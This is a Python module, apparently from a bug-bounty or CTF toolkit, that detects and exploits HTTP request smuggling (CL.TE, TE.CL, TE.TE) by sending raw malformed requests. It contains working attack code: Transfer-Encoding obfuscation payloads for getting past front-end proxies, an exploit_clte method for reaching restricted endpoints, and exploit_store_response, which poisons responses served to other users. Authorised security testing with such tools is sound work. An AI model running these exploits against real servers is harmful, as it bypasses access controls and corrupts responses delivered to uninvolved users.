"""HTTP request smuggling detection and exploitation.

Detects and exploits CL.TE, TE.CL, and TE.TE parser desynchronization through
raw HTTP bytes (raw sockets — `requests` normalizes/rejects the conflicting
Content-Length/Transfer-Encoding headers a smuggling probe depends on):
- CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
- TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
- TE.TE: both use Transfer-Encoding but one side can be obfuscated

Detection combines two signals: a response anomaly (4xx/5xx or a smuggled
marker on the attack or a follow-up probe) AND a timing tell (an unterminated
smuggled chunk makes the desynced back-end wait, delaying the response toward
the timeout) — the classic CL.TE differential.

Usage:
    from bugbounty_ctf.smuggling import SmugglingDetector

    detector = SmugglingDetector("http://target/")
    results = detector.detect()
    if results["vulnerable"]:
        detector.exploit_clte("/api/endpoint", smuggled_request="...")
"""

from __future__ import annotations

import socket
import ssl
import time
from dataclasses import dataclass, field
from typing import Any, Final
from urllib.parse import urlparse

from bugbounty_ctf.engine import SecurityScanner

ANOMALOUS_STATUS_CODES: Final = {400, 408, 500, 502, 503, 504}


def _decode_response(raw: bytes) -> str:
    return raw.decode("utf-8", errors="replace")


def _response_status(raw: bytes) -> int:
    status_line = raw.split(b"\r\n", 1)[0]
    parts = status_line.split(maxsplit=2)
    if len(parts) < 2:
        return 0
    try:
        return int(parts[1])
    except ValueError:
        return 0


def _response_body(raw: bytes) -> str:
    _headers, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        return ""
    return _decode_response(body)


def _response_anomaly(raw: bytes) -> bool:
    decoded = _decode_response(raw).lower()
    return (
        _response_status(raw) in ANOMALOUS_STATUS_CODES
        or "smuggled" in decoded
        or "timeout" in decoded
    )


def _raw_get(host: str, path: str = "/") -> bytes:
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()


def _raw_chunked_post(
    host: str,
    body: str,
    transfer_encoding: str = "Transfer-Encoding: chunked",
) -> bytes:
    return (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"{transfer_encoding}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{body}"
    ).encode()


def _mark_inconclusive(result: SmugglingResult, exc: OSError) -> SmugglingResult:
    result.details["inconclusive"] = True
    result.details["error"] = str(exc)
    return result


def _exploit_result(response: bytes, *, note: str | None = None) -> dict[str, Any]:
    body_text = _response_body(response)[:500]
    result: dict[str, Any] = {
        "success": bool(body_text),
        "status": _response_status(response),
        "response": body_text,
    }
    if note is not None:
        result["note"] = note
    return result


@dataclass
class SmugglingResult:
    """Result from a smuggling detection or exploitation attempt."""

    vulnerable: bool = False
    technique: str = ""
    evidence: str = ""
    timing_diff: float = 0.0
    details: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "vulnerable": self.vulnerable,
            "technique": self.technique,
            "evidence": self.evidence[:300],
            "timing_diff": self.timing_diff,
            "details": self.details,
        }


class SmugglingDetector:
    """HTTP request smuggling detection and exploitation."""

    def __init__(self, target_url: str, *, scanner: SecurityScanner | None = None) -> None:
        self.target_url = target_url.rstrip("/")
        self.scanner = scanner
        self.timeout = 10

    def _host_header(self) -> str:
        """Host header value (host[:port]), correct for IPv6 and userinfo URLs.

        The old ``url.split("//")[1].split("/")[0]`` leaked credentials
        (``user:pass@host``) and broke IPv6 literals (``[::1]``).
        """
        p = urlparse(self.target_url)
        host = p.hostname or ""
        if ":" in host:  # IPv6 literal
            host = f"[{host}]"
        return f"{host}:{p.port}" if p.port else host

    def _connect_target(self) -> tuple[str, int, bool]:
        """Return (host, port, use_tls) for a raw socket connection."""
        p = urlparse(self.target_url)
        use_tls = p.scheme == "https"
        port = p.port or (443 if use_tls else 80)
        return (p.hostname or "", port, use_tls)

    def _send_raw(self, raw: bytes) -> bytes:
        """Send raw HTTP bytes over a fresh socket and return the response bytes.

        Needed for TE.TE testing: requests/http.client normalise header names
        and drop malformed ``Transfer-Encoding`` obfuscations, so the only way
        to actually transmit them is to write the bytes ourselves.
        """
        host, port, use_tls = self._connect_target()
        sock = socket.create_connection((host, port), timeout=self.timeout)
        try:
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(raw)
            chunks: list[bytes] = []
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
                if sum(len(c) for c in chunks) > 65536:
                    break
            return b"".join(chunks)
        finally:
            sock.close()

    def _timed_send(self, raw: bytes) -> tuple[bytes, float]:
        """Send raw bytes and return (response, elapsed_seconds).

        The elapsed time is the timing tell for CL.TE/TE.CL: a desynced
        back-end waits for a chunk terminator that never arrives, pushing the
        response time toward ``self.timeout``.
        """
        start = time.monotonic()
        response = self._send_raw(raw)
        return response, time.monotonic() - start

    def _timing_desync(self, elapsed: float) -> bool:
        """True if a response was delayed enough to indicate a back-end wait."""
        return elapsed >= self.timeout * 0.8

    def detect(self) -> dict[str, Any]:
        """Run all smuggling detection tests."""
        results: list[SmugglingResult] = []

        print(f"[*] Testing HTTP request smuggling on {self.target_url}")

        for test_fn in [self.test_clte, self.test_tecl, self.test_tete]:
            result = test_fn()
            results.append(result)
            if result.vulnerable:
                print(f"  [!] VULNERABLE: {result.technique}")
                break

        vulnerable_any = any(r.vulnerable for r in results)
        return {
            "vulnerable": vulnerable_any,
            "results": [r.to_dict() for r in results],
            "technique": next((r.technique for r in results if r.vulnerable), ""),
        }

    def test_clte(self) -> SmugglingResult:
        """CL.TE detection: front-end uses Content-Length, back-end uses Transfer-Encoding.

        Send a request with both CL and TE headers. If the back-end processes
        the TE chunked body, the remaining bytes will poison the next request.
        """
        result = SmugglingResult(technique="CL.TE")

        body = f"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"
        host = self._host_header()

        try:
            attack_response, elapsed = self._timed_send(_raw_chunked_post(host, body))
            probe_response = self._send_raw(_raw_get(host))
        except OSError as exc:
            return _mark_inconclusive(result, exc)

        if _response_anomaly(attack_response) or _response_anomaly(probe_response):
            result.vulnerable = True
            result.evidence = (
                "CL.TE request caused response anomaly after smuggled prefix was sent"
            )
        elif self._timing_desync(elapsed):
            result.vulnerable = True
            result.timing_diff = elapsed
            result.evidence = (
                f"CL.TE request delayed {elapsed:.1f}s (~timeout) — back-end waited for "
                "a chunk terminator the front-end did not forward"
            )

        return result

    def test_tecl(self) -> SmugglingResult:
        """TE.CL detection: front-end uses Transfer-Encoding, back-end uses Content-Length."""
        result = SmugglingResult(technique="TE.CL")

        body = f"8\r\nSMUGGLED\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"

        host = self._host_header()

        try:
            attack_response, elapsed = self._timed_send(_raw_chunked_post(host, body))
            probe_response = self._send_raw(_raw_get(host))
        except OSError as exc:
            return _mark_inconclusive(result, exc)

        if _response_anomaly(attack_response) or _response_anomaly(probe_response):
            result.vulnerable = True
            result.evidence = (
                "TE.CL request caused response anomaly after smuggled prefix was sent"
            )
        elif self._timing_desync(elapsed):
            result.vulnerable = True
            result.timing_diff = elapsed
            result.evidence = f"TE.CL request delayed {elapsed:.1f}s (~timeout) — possible desync"

        return result

    def test_tete(self) -> SmugglingResult:
        """TE.TE detection: obfuscate Transfer-Encoding to bypass front-end."""
        result = SmugglingResult(technique="TE.TE")

        obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\t",
            "Transfer-Encoding: \tchunked",
            "X: \r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n : chunked",
        ]

        host = self._host_header()
        body = "0\r\n\r\nGET /smuggled HTTP/1.1\r\nFoo: bar"

        for obf in obfuscations:
            # Build the request bytes by hand so the obfuscated Transfer-Encoding
            # header is transmitted verbatim — http.client would normalise or
            # reject these, silently defeating the test.
            try:
                attack_response = self._send_raw(_raw_chunked_post(host, body, obf))
                probe_response = self._send_raw(_raw_get(host))

                if _response_anomaly(attack_response) or _response_anomaly(probe_response):
                    result.vulnerable = True
                    result.evidence = f"Obfuscation '{obf[:50]}' caused response anomaly"
                    result.details["obfuscation"] = obf
                    return result

            except OSError as exc:
                return _mark_inconclusive(result, exc)

        return result

    def exploit_clte(
        self,
        path: str,
        method: str = "GET",
        smuggled_method: str = "POST",
        smuggled_body: str = "",
        smuggled_headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """Exploit CL.TE smuggling to access restricted endpoints."""
        host = self._host_header()

        smuggled_headers = smuggled_headers or {}
        smuggled_header_str = "".join(f"{k}: {v}\r\n" for k, v in smuggled_headers.items())

        smuggled_request = (
            f"{smuggled_method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{smuggled_header_str}"
            f"Content-Length: {len(smuggled_body)}\r\n"
            f"\r\n"
            f"{smuggled_body}"
        )

        body = f"0\r\n\r\n{smuggled_request}"

        try:
            response = self._send_raw(_raw_chunked_post(host, body))
        except OSError as exc:
            return {"success": False, "error": str(exc)}

        return _exploit_result(response)

    def exploit_store_response(
        self,
        smuggled_path: str,
        victim_path: str = "/",
    ) -> dict[str, Any]:
        """Exploit CL.TE to store a response that will be served to another user."""
        host = self._host_header()

        smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"

        body = f"0\r\n\r\n{smuggled}"

        try:
            self._send_raw(_raw_chunked_post(host, body))
            response = self._send_raw(_raw_get(host, victim_path))
        except OSError as exc:
            return {"success": False, "error": str(exc)}

        return _exploit_result(
            response,
            note="Response may have been poisoned — check if content differs from normal",
        )
